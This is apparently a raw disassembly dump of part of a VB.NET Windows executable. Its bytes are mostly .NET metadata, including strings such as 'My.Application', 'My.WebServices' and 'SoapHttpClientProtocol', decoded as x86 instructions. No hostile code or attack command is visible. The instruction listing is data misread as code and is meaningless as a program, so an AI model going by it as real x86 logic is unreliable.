  409b78:	06                   	push   %es
  409b79:	12 19                	adc    (%ecx),%bl
  409b7b:	02 06                	add    (%esi),%al
  409b7d:	0a 03                	or     (%ebx),%al
  409b7f:	06                   	push   %es
  409b80:	1d 05 03 06 12       	sbb    $0x12060305,%eax
  409b85:	1d 03 06 12 21       	sbb    $0x21120603,%eax
  409b8a:	03 06                	add    (%esi),%eax
  409b8c:	12 25 02 06 1c 04    	adc    0x41c0602,%ah
  409b92:	00 01                	add    %al,(%ecx)
  409b94:	1c 0e                	sbb    $0xe,%al
  409b96:	03 00                	add    (%eax),%eax
  409b98:	00 1c 03             	add    %bl,(%ebx,%eax,1)
  409b9b:	00 00                	add    %al,(%eax)
  409b9d:	0e                   	push   %cs
  409b9e:	05 00 01 01 12       	add    $0x12010100,%eax
  409ba3:	29 05 00 01 01 1d    	sub    %eax,0x1d010100
  409ba9:	05 04 00 01 01       	add    $0x1010004,%eax
  409bae:	0e                   	push   %cs
  409baf:	04 00                	add    $0x0,%al
  409bb1:	01 01                	add    %eax,(%ecx)
  409bb3:	1c 03                	sbb    $0x3,%al
  409bb5:	06                   	push   %es
  409bb6:	1d 0e 03 06 12       	sbb    $0x1206030e,%eax
  409bbb:	2d 05 00 02 01       	sub    $0x1020005,%eax
  409bc0:	0e                   	push   %cs
  409bc1:	02 0b                	add    (%ebx),%cl
  409bc3:	00 08                	add    %cl,(%eax)
  409bc5:	18 0e                	sbb    %cl,(%esi)
  409bc7:	08 08                	or     %cl,(%eax)
  409bc9:	08 08                	or     %cl,(%eax)
  409bcb:	08 08                	or     %cl,(%eax)
  409bcd:	08 02                	or     %al,(%edx)
  409bcf:	06                   	push   %es
  409bd0:	18 0a                	sbb    %cl,(%edx)
  409bd2:	00 05 02 06 10 0e    	add    %al,0xe100602
  409bd8:	08 10                	or     %dl,(%eax)
  409bda:	0e                   	push   %cs
  409bdb:	08 03                	or     %al,(%ebx)
  409bdd:	00 00                	add    %al,(%eax)
  409bdf:	02 06                	add    (%esi),%al
  409be1:	00 02                	add    %al,(%edx)
  409be3:	01 0e                	add    %ecx,(%esi)
  409be5:	1d 05 05 00 01       	sbb    $0x1000505,%eax
  409bea:	1c 1d                	sbb    $0x1d,%al
  409bec:	05 07 00 03 01       	add    $0x1030007,%eax
  409bf1:	02 0e                	add    (%esi),%cl
  409bf3:	1d 05 05 00 01       	sbb    $0x1000505,%eax
  409bf8:	18 12                	sbb    %dl,(%edx)
  409bfa:	3c 06                	cmp    $0x6,%al
  409bfc:	00 03                	add    %al,(%ebx)
  409bfe:	18 08                	sbb    %cl,(%eax)
  409c00:	18 18                	sbb    %bl,(%eax)
  409c02:	04 00                	add    $0x0,%al
  409c04:	01 0e                	add    %ecx,(%esi)
  409c06:	09 04 00             	or     %eax,(%eax,%eax,1)
  409c09:	01 00                	add    %eax,(%eax)
  409c0b:	00 03                	add    %al,(%ebx)
  409c0d:	06                   	push   %es
  409c0e:	12 3c 08             	adc    (%eax,%ecx,1),%bh
  409c11:	00 04 18             	add    %al,(%eax,%ebx,1)
  409c14:	08 12                	or     %dl,(%edx)
  409c16:	3c 18                	cmp    $0x18,%al
  409c18:	09 04 00             	or     %eax,(%eax,%eax,1)
  409c1b:	01 02                	add    %eax,(%edx)
  409c1d:	18 07                	sbb    %al,(%edi)
  409c1f:	00 04 18             	add    %al,(%eax,%ebx,1)
  409c22:	18 08                	sbb    %cl,(%eax)
  409c24:	18 18                	sbb    %bl,(%eax)
  409c26:	04 00                	add    $0x0,%al
  409c28:	01 18                	add    %ebx,(%eax)
  409c2a:	0e                   	push   %cs
  409c2b:	03 00                	add    (%eax),%eax
  409c2d:	00 18                	add    %bl,(%eax)
  409c2f:	06                   	push   %es
  409c30:	00 02                	add    %al,(%edx)
  409c32:	09 18                	or     %ebx,(%eax)
  409c34:	10 09                	adc    %cl,(%ecx)
  409c36:	04 00                	add    $0x0,%al
  409c38:	01 06                	add    %eax,(%esi)
  409c3a:	08 05 00 01 02 1d    	or     %al,0x1d020100
  409c40:	05 04 00 01 18       	add    $0x18010004,%eax
  409c45:	09 0c 00             	or     %ecx,(%eax,%eax,1)
  409c48:	07                   	pop    %es
  409c49:	08 09                	or     %cl,(%ecx)
  409c4b:	09 1d 05 12 31 08    	or     %ebx,0x8311205
  409c51:	09 18                	or     %ebx,(%eax)
  409c53:	05 00 02 09 09       	add    $0x9090200,%eax
  409c58:	09 04 00             	or     %eax,(%eax,%eax,1)
  409c5b:	01 08                	add    %ecx,(%eax)
  409c5d:	08 04 00             	or     %al,(%eax,%eax,1)
  409c60:	01 02                	add    %eax,(%edx)
  409c62:	0e                   	push   %cs
  409c63:	34 61                	xor    $0x61,%al
  409c65:	00 62 00             	add    %ah,0x0(%edx)
  409c68:	63 00                	arpl   %eax,(%eax)
  409c6a:	64 00 65 00          	add    %ah,%fs:0x0(%ebp)
  409c6e:	66 00 67 00          	data16 add %ah,0x0(%edi)
  409c72:	68 00 69 00 6a       	push   $0x6a006900
  409c77:	00 6b 00             	add    %ch,0x0(%ebx)
  409c7a:	6c                   	insb   (%dx),%es:(%edi)
  409c7b:	00 6d 00             	add    %ch,0x0(%ebp)
  409c7e:	6e                   	outsb  %ds:(%esi),(%dx)
  409c7f:	00 6f 00             	add    %ch,0x0(%edi)
  409c82:	70 00                	jo     0x409c84
  409c84:	71 00                	jno    0x409c86
  409c86:	72 00                	jb     0x409c88
  409c88:	73 00                	jae    0x409c8a
  409c8a:	74 00                	je     0x409c8c
  409c8c:	75 00                	jne    0x409c8e
  409c8e:	76 00                	jbe    0x409c90
  409c90:	77 00                	ja     0x409c92
  409c92:	78 00                	js     0x409c94
  409c94:	79 00                	jns    0x409c96
  409c96:	7a 00                	jp     0x409c98
  409c98:	03 06                	add    (%esi),%eax
  409c9a:	12 35 04 00 01 0e    	adc    0xe010004,%dh
  409ca0:	08 06                	or     %al,(%esi)
  409ca2:	00 01                	add    %al,(%ecx)
  409ca4:	02 10                	add    (%eax),%dl
  409ca6:	11 40 03             	adc    %eax,0x3(%eax)
  409ca9:	06                   	push   %es
  409caa:	11 40 03             	adc    %eax,0x3(%eax)
  409cad:	00 00                	add    %al,(%eax)
  409caf:	08 03                	or     %al,(%ebx)
  409cb1:	06                   	push   %es
  409cb2:	11 39                	adc    %edi,(%ecx)
  409cb4:	07                   	pop    %es
  409cb5:	00 03                	add    %al,(%ebx)
  409cb7:	08 18                	or     %bl,(%eax)
  409cb9:	12 31                	adc    (%ecx),%dh
  409cbb:	08 06                	or     %al,(%esi)
  409cbd:	00 01                	add    %al,(%ecx)
  409cbf:	11 44 11 44          	adc    %eax,0x44(%ecx,%edx,1)
  409cc3:	05 00 01 1d 05       	add    $0x51d0100,%eax
  409cc8:	0e                   	push   %cs
  409cc9:	05 00 01 0e 1d       	add    $0x1d0e0100,%eax
  409cce:	05 06 00 02 02       	add    $0x2020006,%eax
  409cd3:	0e                   	push   %cs
  409cd4:	1d 05 06 00 01       	sbb    $0x1000605,%eax
  409cd9:	1d 05 1d 05 03       	sbb    $0x3051d05,%eax
  409cde:	06                   	push   %es
  409cdf:	12 3d 05 20 02 01    	adc    0x1022005,%bh
  409ce5:	1c 18                	sbb    $0x18,%al
  409ce7:	0a 20                	or     (%eax),%ah
  409ce9:	05 12 29 08 18       	add    $0x18082912,%eax
  409cee:	18 12                	sbb    %dl,(%edx)
  409cf0:	45                   	inc    %ebp
  409cf1:	1c 05                	sbb    $0x5,%al
  409cf3:	20 01                	and    %al,(%ecx)
  409cf5:	18 12                	sbb    %dl,(%edx)
  409cf7:	29 06                	sub    %eax,(%esi)
  409cf9:	20 03                	and    %al,(%ebx)
  409cfb:	18 08                	sbb    %cl,(%eax)
  409cfd:	18 18                	sbb    %bl,(%eax)
  409cff:	02 06                	add    (%esi),%al
  409d01:	09 03                	or     %eax,(%ebx)
  409d03:	06                   	push   %es
  409d04:	11 44 04 00          	adc    %eax,0x0(%esp,%eax,1)
  409d08:	00 00                	add    %al,(%eax)
  409d0a:	80 04 02 00          	addb   $0x0,(%edx,%eax,1)
  409d0e:	00 00                	add    %al,(%eax)
  409d10:	04 01                	add    $0x1,%al
  409d12:	00 00                	add    %al,(%eax)
  409d14:	00 05 20 01 01 11    	add    %al,0x11010120
  409d1a:	55                   	push   %ebp
  409d1b:	08 01                	or     %al,(%ecx)
  409d1d:	00 01                	add    %al,(%ecx)
  409d1f:	00 00                	add    %al,(%eax)
  409d21:	00 00                	add    %al,(%eax)
  409d23:	00 05 20 02 01 0e    	add    %al,0xe010220
  409d29:	0e                   	push   %cs
  409d2a:	18 01                	sbb    %al,(%ecx)
  409d2c:	00 0a                	add    %cl,(%edx)
  409d2e:	4d                   	dec    %ebp
  409d2f:	79 54                	jns    0x409d85
  409d31:	65 6d                	gs insl (%dx),%es:(%edi)
  409d33:	70 6c                	jo     0x409da1
  409d35:	61                   	popa
  409d36:	74 65                	je     0x409d9d
  409d38:	08 31                	or     %dh,(%ecx)
  409d3a:	34 2e                	xor    $0x2e,%al
  409d3c:	30 2e                	xor    %ch,(%esi)
  409d3e:	30 2e                	xor    %ch,(%esi)
  409d40:	30 00                	xor    %al,(%eax)
  409d42:	00 06                	add    %al,(%esi)
  409d44:	15 12 18 01 12       	adc    $0x12011812,%eax
  409d49:	0c 06                	or     $0x6,%al
  409d4b:	15 12 18 01 12       	adc    $0x12011812,%eax
  409d50:	08 06                	or     %al,(%esi)
  409d52:	15 12 18 01 12       	adc    $0x12011812,%eax
  409d57:	11 06                	adc    %eax,(%esi)
  409d59:	15 12 18 01 12       	adc    $0x12011812,%eax
  409d5e:	14 04                	adc    $0x4,%al
  409d60:	07                   	pop    %es
  409d61:	01 12                	add    %edx,(%edx)
  409d63:	0c 04                	or     $0x4,%al
  409d65:	07                   	pop    %es
  409d66:	01 12                	add    %edx,(%edx)
  409d68:	08 04 07             	or     %al,(%edi,%eax,1)
  409d6b:	01 12                	add    %edx,(%edx)
  409d6d:	11 04 07             	adc    %eax,(%edi,%eax,1)
  409d70:	01 12                	add    %edx,(%edx)
  409d72:	14 04                	adc    $0x4,%al
  409d74:	20 01                	and    %al,(%ecx)
  409d76:	01 0e                	add    %ecx,(%esi)
  409d78:	0c 01                	or     $0x1,%al
  409d7a:	00 07                	add    %al,(%edi)
  409d7c:	4d                   	dec    %ebp
  409d7d:	79 2e                	jns    0x409dad
  409d7f:	55                   	push   %ebp
  409d80:	73 65                	jae    0x409de7
  409d82:	72 00                	jb     0x409d84
  409d84:	00 13                	add    %dl,(%ebx)
  409d86:	01 00                	add    %eax,(%eax)
  409d88:	0e                   	push   %cs
  409d89:	4d                   	dec    %ebp
  409d8a:	79 2e                	jns    0x409dba
  409d8c:	41                   	inc    %ecx
  409d8d:	70 70                	jo     0x409dff
  409d8f:	6c                   	insb   (%dx),%es:(%edi)
  409d90:	69 63 61 74 69 6f 6e 	imul   $0x6e6f6974,0x61(%ebx),%esp
  409d97:	00 00                	add    %al,(%eax)
  409d99:	13 01                	adc    (%ecx),%eax
  409d9b:	00 0e                	add    %cl,(%esi)
  409d9d:	4d                   	dec    %ebp
  409d9e:	79 2e                	jns    0x409dce
  409da0:	57                   	push   %edi
  409da1:	65 62 53 65          	bound  %edx,%gs:0x65(%ebx)
  409da5:	72 76                	jb     0x409e1d
  409da7:	69 63 65 73 00 00 10 	imul   $0x10000073,0x65(%ebx),%esp
  409dae:	01 00                	add    %eax,(%eax)
  409db0:	0b 4d 79             	or     0x79(%ebp),%ecx
  409db3:	2e 43                	cs inc %ebx
  409db5:	6f                   	outsl  %ds:(%esi),(%dx)
  409db6:	6d                   	insl   (%dx),%es:(%edi)
  409db7:	70 75                	jo     0x409e2e
  409db9:	74 65                	je     0x409e20
  409dbb:	72 00                	jb     0x409dbd
  409dbd:	00 04 00             	add    %al,(%eax,%eax,1)
  409dc0:	01 1c 1c             	add    %ebx,(%esp,%ebx,1)
  409dc3:	03 07                	add    (%edi),%eax
  409dc5:	01 02                	add    %eax,(%edx)
  409dc7:	03 07                	add    (%edi),%eax
  409dc9:	01 08                	add    %ecx,(%eax)
  409dcb:	06                   	push   %es
  409dcc:	00 01                	add    %al,(%ecx)
  409dce:	12 15 11 71 04 07    	adc    0x7047111,%dl
  409dd4:	01 12                	add    %edx,(%edx)
  409dd6:	15 03 07 01 0e       	adc    $0xe010703,%eax
  409ddb:	05 10 01 00 1e       	add    $0x1e000110,%eax
  409de0:	00 04 0a             	add    %al,(%edx,%ecx,1)
  409de3:	01 1e                	add    %ebx,(%esi)
  409de5:	00 04 07             	add    %al,(%edi,%eax,1)
  409de8:	01 1e                	add    %ebx,(%esi)
  409dea:	00 07                	add    %al,(%edi)
  409dec:	20 04 01             	and    %al,(%ecx,%eax,1)
  409def:	0e                   	push   %cs
  409df0:	0e                   	push   %cs
  409df1:	0e                   	push   %cs
  409df2:	0e                   	push   %cs
  409df3:	61                   	popa
  409df4:	01 00                	add    %eax,(%eax)
  409df6:	34 53                	xor    $0x53,%al
  409df8:	79 73                	jns    0x409e6d
  409dfa:	74 65                	je     0x409e61
  409dfc:	6d                   	insl   (%dx),%es:(%edi)
  409dfd:	2e 57                	cs push %edi
  409dff:	65 62 2e             	bound  %ebp,%gs:(%esi)
  409e02:	53                   	push   %ebx
  409e03:	65 72 76             	gs jb  0x409e7c
  409e06:	69 63 65 73 2e 50 72 	imul   $0x72502e73,0x65(%ebx),%esp
  409e0d:	6f                   	outsl  %ds:(%esi),(%dx)
  409e0e:	74 6f                	je     0x409e7f
  409e10:	63 6f 6c             	arpl   %ebp,0x6c(%edi)
  409e13:	73 2e                	jae    0x409e43
  409e15:	53                   	push   %ebx
  409e16:	6f                   	outsl  %ds:(%esi),(%dx)
  409e17:	61                   	popa
  409e18:	70 48                	jo     0x409e62
  409e1a:	74 74                	je     0x409e90
  409e1c:	70 43                	jo     0x409e61
  409e1e:	6c                   	insb   (%dx),%es:(%edi)
  409e1f:	69 65 6e 74 50 72 6f 	imul   $0x6f725074,0x6e(%ebp),%esp
  409e26:	74 6f                	je     0x409e97
  409e28:	63 6f 6c             	arpl   %ebp,0x6c(%edi)
  409e2b:	12 43 72             	adc    0x72(%ebx),%al
  409e2e:	65 61                	gs popa
  409e30:	74 65                	je     0x409e97
  409e32:	5f                   	pop    %edi
  409e33:	5f                   	pop    %edi
  409e34:	49                   	dec    %ecx
  409e35:	6e                   	outsb  %ds:(%esi),(%dx)
  409e36:	73 74                	jae    0x409eac
  409e38:	61                   	popa
  409e39:	6e                   	outsb  %ds:(%esi),(%dx)
  409e3a:	63 65 5f             	arpl   %esp,0x5f(%ebp)
  409e3d:	5f                   	pop    %edi
  409e3e:	13 44 69 73          	adc    0x73(%ecx,%ebp,2),%eax
  409e42:	70 6f                	jo     0x409eb3
  409e44:	73 65                	jae    0x409eab
  409e46:	5f                   	pop    %edi
  409e47:	5f                   	pop    %edi
  409e48:	49                   	dec    %ecx
  409e49:	6e                   	outsb  %ds:(%esi),(%dx)
  409e4a:	73 74                	jae    0x409ec0
  409e4c:	61                   	popa
  409e4d:	6e                   	outsb  %ds:(%esi),(%dx)
  409e4e:	63 65 5f             	arpl   %esp,0x5f(%ebp)
  409e51:	5f                   	pop    %edi
  409e52:	00 00                	add    %al,(%eax)
  409e54:	00 06                	add    %al,(%esi)
  409e56:	15 12 18 01 13       	adc    $0x13011812,%eax
  409e5b:	00 04 0a             	add    %al,(%edx,%ecx,1)
  409e5e:	01 13                	add    %edx,(%ebx)
  409e60:	00 04 07             	add    %al,(%edi,%eax,1)
  409e63:	01 13                	add    %edx,(%ebx)
  409e65:	00 04 20             	add    %al,(%eax,%eiz,1)
  409e68:	01 01                	add    %eax,(%ecx)
  409e6a:	02 05 01 00 00 00    	add    0x1,%al
  409e70:	00 05 00 02 0e 0e    	add    %al,0xe0e0200
  409e76:	0e                   	push   %cs
  409e77:	07                   	pop    %es
  409e78:	20 02                	and    %al,(%edx)
  409e7a:	12 29                	adc    (%ecx),%ch
  409e7c:	12 45 1c             	adc    0x1c(%ebp),%al
  409e7f:	05 20 01 01 12       	add    $0x12010120,%eax
  409e84:	29 31                	sub    %esi,(%ecx)
  409e86:	01 00                	add    %eax,(%eax)
  409e88:	12 3c 67             	adc    (%edi,%eiz,2),%bh
  409e8b:	65 6e                	outsb  %gs:(%esi),(%dx)
  409e8d:	65 72 61             	gs jb  0x409ef1
  409e90:	74 65                	je     0x409ef7
  409e92:	64 20 6d 65          	and    %ch,%fs:0x65(%ebp)
  409e96:	74 68                	je     0x409f00
  409e98:	6f                   	outsl  %ds:(%esi),(%dx)
  409e99:	64 3e 01 00          	fs add %eax,%ds:(%eax)
  409e9d:	54                   	push   %esp
  409e9e:	0e                   	push   %cs
  409e9f:	04 54                	add    $0x54,%al
  409ea1:	79 70                	jns    0x409f13
  409ea3:	65 12 3c 67          	adc    %gs:(%edi,%eiz,2),%bh
  409ea7:	65 6e                	outsb  %gs:(%esi),(%dx)
  409ea9:	65 72 61             	gs jb  0x409f0d
  409eac:	74 65                	je     0x409f13
  409eae:	64 20 6d 65          	and    %ch,%fs:0x65(%ebp)
  409eb2:	74 68                	je     0x409f1c
  409eb4:	6f                   	outsl  %ds:(%esi),(%dx)
  409eb5:	64 3e 04 00          	fs ds add $0x0,%al
  409eb9:	01 01                	add    %eax,(%ecx)
  409ebb:	08 04 00             	or     %al,(%eax,%eax,1)
  409ebe:	01 0e                	add    %ecx,(%esi)
  409ec0:	1c 06                	sbb    $0x6,%al
  409ec2:	00 01                	add    %al,(%ecx)
  409ec4:	01 12                	add    %edx,(%edx)
  409ec6:	80 99 06 20 01 1d 0e 	sbbb   $0xe,0x1d012006(%ecx)
  409ecd:	1d 03 06 20 01       	sbb    $0x1200603,%eax
  409ed2:	01 12                	add    %edx,(%edx)
  409ed4:	80 ad 0c 07 05 0e 12 	subb   $0x12,0xe05070c(%ebp)
  409edb:	2d 12 2d 12 80       	sub    $0x80122d12,%eax
  409ee0:	99                   	cltd
  409ee1:	1d 03 04 00 01       	sbb    $0x1000403,%eax
  409ee6:	01 02                	add    %eax,(%edx)
  409ee8:	06                   	push   %es
  409ee9:	00 01                	add    %al,(%ecx)
  409eeb:	01 11                	add    %edx,(%ecx)
  409eed:	80 b9 04 20 01 0e 0e 	cmpb   $0xe,0xe012004(%ecx)
  409ef4:	0c 07                	or     $0x7,%al
  409ef6:	04 0e                	add    $0xe,%al
  409ef8:	12 80 99 12 80 b1    	adc    -0x4e7fed67(%eax),%al
  409efe:	12 80 99 05 20 02    	adc    0x2200599(%eax),%al
  409f04:	08 08                	or     %cl,(%eax)
  409f06:	08 03                	or     %al,(%ebx)
  409f08:	20 00                	and    %al,(%eax)
  409f0a:	02 0c 20             	add    (%eax,%eiz,1),%cl
  409f0d:	03 01                	add    (%ecx),%eax
  409f0f:	11 80 cd 11 80 d1    	adc    %eax,-0x2e7fee33(%eax)
  409f15:	11 80 d5 04 20 01    	adc    %eax,0x12004d5(%eax)
  409f1b:	01 08                	add    %ecx,(%eax)
  409f1d:	04 00                	add    $0x0,%al
  409f1f:	01 08                	add    %ecx,(%eax)
  409f21:	0e                   	push   %cs
  409f22:	05 20 02 01 0e       	add    $0xe010220,%eax
  409f27:	08 0e                	or     %cl,(%esi)
  409f29:	20 06                	and    %al,(%esi)
  409f2b:	12 29                	adc    (%ecx),%ch
  409f2d:	1d 05 08 08 11       	sbb    $0x11080805,%eax
  409f32:	80 dd 12             	sbb    $0x12,%ch
  409f35:	45                   	inc    %ebp
  409f36:	1c 09                	sbb    $0x9,%al
  409f38:	20 04 01             	and    %al,(%ecx,%eax,1)
  409f3b:	12 80 c9 1c 08 08    	adc    0x8081cc9(%eax),%al
  409f41:	09 07                	or     %eax,(%edi)
  409f43:	03 1c 12             	add    (%edx,%edx,1),%ebx
  409f46:	80 c9 12             	or     $0x12,%cl
  409f49:	80 99 05 20 02 0e 0e 	sbbb   $0xe,0xe022005(%ecx)
  409f50:	0e                   	push   %cs
  409f51:	05 00 00 12 80       	add    $0x80120000,%eax
  409f56:	e9 05 00 01 0e       	jmp    0xe419f60
  409f5b:	1d 1c 09 07 04       	sbb    $0x407091c,%eax
  409f60:	1c 12                	sbb    $0x12,%al
  409f62:	80 e5 02             	and    $0x2,%ch
  409f65:	1d 1c 05 20 00       	sbb    $0x20051c,%eax
  409f6a:	11 80 f5 0c 07 04    	adc    %eax,0x4070cf5(%eax)
  409f70:	0e                   	push   %cs
  409f71:	12 80 f1 12 80 99    	adc    -0x667fed0f(%eax),%al
  409f77:	11 80 f5 06 00 03    	adc    %eax,0x30006f5(%eax)
  409f7d:	08 0e                	or     %cl,(%esi)
  409f7f:	0e                   	push   %cs
  409f80:	02 06                	add    (%esi),%al
  409f82:	07                   	pop    %es
  409f83:	02 0e                	add    (%esi),%cl
  409f85:	12 80 99 05 00 00    	adc    0x599(%eax),%al
  409f8b:	12 81 05 06 20 01    	adc    0x1200605(%ecx),%al
  409f91:	01 12                	add    %edx,(%edx)
  409f93:	81 05 06 20 01 02 11 	addl   $0x70d8111,0x2012006
  409f9a:	81 0d 07 
  409f9d:	07                   	pop    %es
  409f9e:	03 0e                	add    (%esi),%ecx
  409fa0:	12 80 99 02 06 00    	adc    0x60299(%eax),%al
  409fa6:	03 0e                	add    (%esi),%ecx
  409fa8:	0e                   	push   %cs
  409fa9:	0e                   	push   %cs
  409faa:	0e                   	push   %cs
  409fab:	05 20 00 12 81       	add    $0x81120020,%eax
  409fb0:	19 05 20 00 12 81    	sbb    %eax,0x81120020
  409fb6:	1d 05 20 00 12       	sbb    $0x12002005,%eax
  409fbb:	81 15 04 20 01 1c 0e 	adcl   $0x120050e,0x1c012004
  409fc2:	05 20 01 
  409fc5:	12 31                	adc    (%ecx),%dh
  409fc7:	0e                   	push   %cs
  409fc8:	05 20 02 0e 08       	add    $0x80e0220,%eax
  409fcd:	08 11                	or     %dl,(%ecx)
  409fcf:	07                   	pop    %es
  409fd0:	06                   	push   %es
  409fd1:	0e                   	push   %cs
  409fd2:	12 81 11 12 31 12    	adc    0x12311211(%ecx),%al
  409fd8:	81 15 12 80 99 12 81 	adcl   $0x20061d81,0x12998012
  409fdf:	1d 06 20 
  409fe2:	01 01                	add    %eax,(%ecx)
  409fe4:	12 81 21 05 00 02    	adc    0x2000521(%ecx),%al
  409fea:	1c 1c                	sbb    $0x1c,%al
  409fec:	1c 10                	sbb    $0x10,%al
  409fee:	07                   	pop    %es
  409fef:	06                   	push   %es
  409ff0:	0e                   	push   %cs
  409ff1:	12 81 21 12 81 11    	adc    0x11811221(%ecx),%al
  409ff7:	0e                   	push   %cs
  409ff8:	12 81 25 12 81 1d    	adc    0x1d811225(%ecx),%al
  409ffe:	09 07                	or     %eax,(%edi)
  40a000:	03 0e                	add    (%esi),%ecx
  40a002:	12 81 25 12 80 99    	adc    -0x667feddb(%ecx),%al
  40a008:	05 20 00 12 80       	add    $0x80120020,%eax
  40a00d:	e5 03                	in     $0x3,%eax
  40a00f:	20 00                	and    %al,(%eax)
  40a011:	0b 04 00             	or     (%eax,%eax,1),%eax
  40a014:	01 0d 1c 04 00 01    	add    %ecx,0x100041c
  40a01a:	0d 0d 09 07 05       	or     $0x507090d,%eax
  40a01f:	0e                   	push   %cs
  40a020:	0a 0e                	or     (%esi),%cl
  40a022:	12 80 99 0d 05 20    	adc    0x20050d99(%eax),%al
  40a028:	01 08                	add    %ecx,(%eax)
  40a02a:	12 29                	adc    (%ecx),%ch
  40a02c:	04 20                	add    $0x20,%al
  40a02e:	00 1d 05 04 00 01    	add    %bl,0x1000405
  40a034:	0a 0e                	or     (%esi),%cl
  40a036:	04 20                	add    $0x20,%al
  40a038:	01 01                	add    %eax,(%ecx)
  40a03a:	05 07 20 03 01       	add    $0x1032007,%eax
  40a03f:	1d 05 08 08 03       	sbb    $0x3080805,%eax
  40a044:	20 00                	and    %al,(%eax)
  40a046:	0a 06                	or     (%esi),%al
  40a048:	20 01                	and    %al,(%ecx)
  40a04a:	01 12                	add    %edx,(%edx)
  40a04c:	81 41 11 00 08 1c 1c 	addl   $0x1c1c0800,0x11(%ecx)
  40a053:	12 15 0e 1d 1c 1d    	adc    0x1d1c1d0e,%dl
  40a059:	0e                   	push   %cs
  40a05a:	1d 12 15 1d 02       	sbb    $0x21d1512,%eax
  40a05f:	02 09                	add    (%ecx),%cl
  40a061:	07                   	pop    %es
  40a062:	04 08                	add    $0x8,%al
  40a064:	1c 12                	sbb    $0x12,%al
  40a066:	80 99 1d 1c 05 07 01 	sbbb   $0x1,0x7051c1d(%ecx)
  40a06d:	12 80 99 06 00 02    	adc    0x2000699(%eax),%al
  40a073:	01 1c 10             	add    %ebx,(%eax,%edx,1)
  40a076:	02 07                	add    (%edi),%al
  40a078:	20 02                	and    %al,(%edx)
  40a07a:	02 08                	add    (%eax),%cl
  40a07c:	11 81 51 0d 07 06    	adc    %eax,0x6070d51(%ecx)
  40a082:	12 1d 1d 05 1d 05    	adc    0x51d051d,%bl
  40a088:	12 80 99 1c 02 0e    	adc    0xe021c99(%eax),%al
  40a08e:	07                   	pop    %es
  40a08f:	04 12                	add    $0x12,%al
  40a091:	80 99 12 80 99 12 80 	sbbb   $0x80,0x12998012(%ecx)
  40a098:	99                   	cltd
  40a099:	12 80 99 05 00 01    	adc    0x1000599(%eax),%al
  40a09f:	0e                   	push   %cs
  40a0a0:	1d 0e 07 07 02       	sbb    $0x207070e,%eax
  40a0a5:	12 80 99 1d 0e 02    	adc    0x20e1d99(%eax),%al
  40a0ab:	1d 05 0a 00 04       	sbb    $0x4000a05,%eax
  40a0b0:	1d 0e 0e 0e 08       	sbb    $0x80e0e0e,%eax
  40a0b5:	11 81 6d 06 20 01    	adc    %eax,0x120066d(%ecx)
  40a0bb:	01 11                	add    %edx,(%ecx)
  40a0bd:	81 75 06 00 01 12 81 	xorl   $0x81120100,0x6(%ebp)
  40a0c4:	7d 0e                	jge    0x40a0d4
  40a0c6:	09 00                	or     %eax,(%eax)
  40a0c8:	04 08                	add    $0x8,%al
  40a0ca:	0e                   	push   %cs
  40a0cb:	11 81 81 02 08 04    	adc    %eax,0x4080281(%ecx)
  40a0d1:	20 01                	and    %al,(%ecx)
  40a0d3:	01 1c 06             	add    %ebx,(%esi,%eax,1)
  40a0d6:	00 01                	add    %al,(%ecx)
  40a0d8:	0e                   	push   %cs
  40a0d9:	11 81 85 05 00 02    	adc    %eax,0x2000585(%ecx)
  40a0df:	01 0e                	add    %ecx,(%esi)
  40a0e1:	0e                   	push   %cs
  40a0e2:	05 20 00 12 81       	add    $0x81120020,%eax
  40a0e7:	8d 05 20 00 12 81    	lea    0x81120020,%eax
  40a0ed:	91                   	xchg   %eax,%ecx
  40a0ee:	05 00 00 12 81       	add    $0x81120000,%eax
  40a0f3:	95                   	xchg   %eax,%ebp
  40a0f4:	05 20 00 11 81       	add    $0x81110020,%eax
  40a0f9:	61                   	popa
  40a0fa:	08 20                	or     %ah,(%eax)
  40a0fc:	03 01                	add    (%ecx),%eax
  40a0fe:	08 08                	or     %cl,(%eax)
  40a100:	11 81 99 08 00 01    	adc    %eax,0x1000899(%ecx)
  40a106:	12 81 59 12 81 9d    	adc    -0x627eeda7(%ecx),%al
  40a10c:	05 20 02 01 08       	add    $0x8010220,%eax
  40a111:	08 0d 20 06 01 08    	or     %cl,0x8010620
  40a117:	08 08                	or     %cl,(%eax)
  40a119:	08 11                	or     %dl,(%ecx)
  40a11b:	81 5d 11 81 a1 07 20 	sbbl   $0x2007a181,0x11(%ebp)
  40a122:	04 01                	add    $0x1,%al
  40a124:	08 08                	or     %cl,(%eax)
  40a126:	08 08                	or     %cl,(%eax)
  40a128:	0f 20 04             	mov    %cr0,%esp
  40a12b:	01 12                	add    %edx,(%edx)
  40a12d:	81 9d 11 81 61 11 81 	sbbl   $0x81116181,0x11618111(%ebp)
  40a134:	61 11 81 
  40a137:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  40a138:	05 00 00 12 81       	add    $0x81120000,%eax
  40a13d:	a9 09 20 02 01       	test   $0x1022009,%eax
  40a142:	12 81 3d 12 81 a9    	adc    -0x567eedc3(%ecx),%al
  40a148:	43                   	inc    %ebx
  40a149:	07                   	pop    %es
  40a14a:	19 1d 0e 0e 12 80    	sbb    %ebx,0x80120e0e
  40a150:	b1 12                	mov    $0x12,%cl
  40a152:	80 99 12 80 99 12 80 	sbbb   $0x80,0x12998012(%ecx)
  40a159:	99                   	cltd
  40a15a:	12 80 99 0e 12 80    	adc    -0x7fedf167(%eax),%al
  40a160:	99                   	cltd
  40a161:	1d 05 12 81 59       	sbb    $0x59811205,%eax
  40a166:	11 81 5d 11 81 61    	adc    %eax,0x6181115d(%ecx)
  40a16c:	12 81 59 12 81 65    	adc    0x65811259(%ecx),%al
  40a172:	12 1d 12 81 65 12    	adc    0x12658112,%bl
  40a178:	80 99 12 80 99 0e 1d 	sbbb   $0x1d,0xe998012(%ecx)
  40a17f:	0e                   	push   %cs
  40a180:	11 81 61 11 81 61    	adc    %eax,0x61811161(%ecx)
  40a186:	11 81 61 11 81 61    	adc    %eax,0x61811161(%ecx)
  40a18c:	05 00 00 12 81       	add    $0x81120000,%eax
  40a191:	b1 07                	mov    $0x7,%cl
  40a193:	20 01                	and    %al,(%ecx)
  40a195:	12 81 b5 1d 05 05    	adc    0x5051db5(%ecx),%al
  40a19b:	20 00                	and    %al,(%eax)
  40a19d:	1d 12 15 06 20       	sbb    $0x20061512,%eax
  40a1a2:	00 1d 12 81 ad 10    	add    %bl,0x10ad8112
  40a1a8:	00 07                	add    %al,(%edi)
  40a1aa:	1c 1c                	sbb    $0x1c,%al
  40a1ac:	12 15 0e 1d 1c 1d    	adc    0x1d1c1d0e,%dl
  40a1b2:	0e                   	push   %cs
